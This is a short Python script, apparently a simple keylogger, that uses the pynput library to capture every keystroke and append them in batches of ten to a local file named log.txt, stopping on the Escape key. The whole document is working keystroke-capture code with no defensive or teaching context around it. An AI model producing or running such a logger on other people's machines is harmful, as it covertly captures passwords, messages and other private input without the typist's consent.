from pynput.keyboard import Key, Listener

count = 0
typed = []


def on_press(key):
    global count, typed
    typed.append(key)
    count += 1

    if count == 10:
        write_file(typed)
        count = 0
        typed = []


def on_release(key):
    global typed
    if key == Key.esc:
        write_file(typed)
        return False


def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('space') > 0:
                file.write('\n')
            else:
                file.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
